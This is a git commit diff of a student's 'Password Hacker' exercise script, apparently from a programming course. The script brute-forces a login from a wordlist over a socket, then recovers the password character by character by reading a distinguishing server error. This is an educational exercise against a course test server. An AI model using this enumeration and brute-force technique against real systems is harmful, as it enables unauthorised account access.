97682f012decd2e08d3d07d0d47da1b320b32dc7
Alyona Klekovkina <like.the.sunshine.17@gmail.com>
2020-12-02 18:03:46 +0300

    Stage 4/5: Catching exception need to rewrite the create_password function
    need to rewrite the repeated 2 loops

--- hack.py
+++ hack.py
@@ -1,23 +1,36 @@
 # write your code here
-import itertools
 import sys
 import socket
+import json
+import string
 
-list_of_passwords = []
-with open('/Users/alyona/PycharmProjects/Password Hacker/Password Hacker/task/hacking/passwords.txt', 'r', encoding='utf-8') as f:
-    for line in f:
-        list_of_passwords.append(line.strip())
+p = ''
 
 
-def password_generator(the_list):
-    for word in the_list:
-        if not word.isdigit():
-            combinations = itertools.product(*([letter.lower(), letter.upper()] for letter in word))
-            for j in combinations:
-                password = ''
-                for k in j:
-                    password += str(k)
-                yield password
+def create_list(name_txt):
+    the_list = []
+    with open('/Users/alyona/PycharmProjects/Password Hacker/Password Hacker/task/hacking/{}.txt'.format(name_txt), 'r', encoding='utf-8') as f:
+        for line in f:
+            the_list.append(line.strip())
+    return the_list
+
+
+list_of_logins = create_list('logins')
+
+
+def create_json_login():
+    for login in list_of_logins:
+        yield json.dumps({'login': login, 'password': ''})
+
+
+def create_json_password():
+    lower_letters_list = list(string.ascii_lowercase)
+    upper_letters_list = list(string.ascii_uppercase)
+    numbers_list = list(range(10))
+    # the_list needs to be searched from the beginning. But I didn't manage to come with the better solution
+    the_list = lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list + lower_letters_list + upper_letters_list + numbers_list
+    for i in the_list:
+        yield json.dumps({'login': the_login, 'password': p + str(i)})
 
 
 args = sys.argv
@@ -27,14 +40,31 @@ port = int(args[2])
 with socket.socket() as client_socket:
     address = (hostname, port)
     client_socket.connect(address)
-    attempt = password_generator(list_of_passwords)
+    get_login = create_json_login()
 
-    for j in attempt:
+    for j in get_login:
         data = j.encode('utf-8')
         client_socket.send(data)
         response = client_socket.recv(1024)
         response = response.decode('utf-8')
-        if response == 'Connection success!':
-            print(j)
+        response = json.loads(response)
+        if response == {"result": "Exception happened during login"}:
+            result = json.loads(j)
+            the_login = result["login"]
+            break
+
+    get_password = create_json_password()
+    for k in get_password:
+        data = k.encode('utf-8')
+        client_socket.send(data)
+        response = client_socket.recv(1024)
+        response = response.decode('utf-8')
+        response = json.loads(response)
+        if response == {"result": "Exception happened during login"}:
+            result = json.loads(k)
+            the_password = result["password"]
+            p = the_password
+        elif response == {"result": "Connection success!"}:
+            print(k)
             client_socket.close()
             break
